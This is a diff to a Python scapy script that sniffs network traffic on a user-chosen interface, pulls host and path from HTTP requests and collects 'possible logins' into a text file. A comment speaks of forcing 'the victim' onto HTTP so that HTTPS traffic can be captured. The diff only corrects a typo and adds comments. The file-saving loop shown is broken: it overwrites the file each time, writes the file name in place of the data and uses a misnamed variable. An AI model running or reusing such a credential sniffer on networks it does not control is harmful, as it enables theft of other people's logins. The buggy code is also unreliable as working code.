@@ -6,7 +6,7 @@ It Will Sniff Any Data Not Just Web Data On HTTP Protocol You Can Add A Filter
 Feel Free TO Edit It Is Yours!
 I Will Clean The Code On That Update And Add Some Things!
 I Have Explain The Code On Some Comments
-Maybe There Is Some Problems I Wil Try To Solvw It LOL!
+Maybe There Is Some Problems I Wil Try To Solve It LOL! -- Solved!
 Have Fun!
 '''
 import scapy.all as scapy 
@@ -22,7 +22,7 @@ PossibleLoginList = []
 InterFace = input("\n[+] Enter Interface: ") # EX: eth0 , wlan0
 
 def StartSniffData(NetowrkInterface):
-	scapy.sniff(iface=NetowrkInterface,store=False,prn=SniffNetworkTrafic)
+	scapy.sniff(iface=NetowrkInterface,store=False,prn=SniffNetworkTrafic) # Start Sniff With Selected InterFace Here
 
 def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
 	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
@@ -51,8 +51,8 @@ def ExtractAllPossibleLoginsOnTXT():
 	for Data in PossibleLoginList: # For Each Item iN This List Take Every Item And Put It In that File With New Line!
 		with open('{0}.txt'.format(FileName),'w') as LoginsFile:
 			LoginFile.write("{0}\n".format(FileName)) # Write Data To login File
-		print("[+] Data Saved!")
-
+		print("[+] Data Saved!") # Print "Data Saved" LOL
+		
 # Start Functions After Get Inputs!
 SmallBanner() # Print The Banner
 StartSniffData(InterFace) # Start Sniff Data From Selected InterFACE 
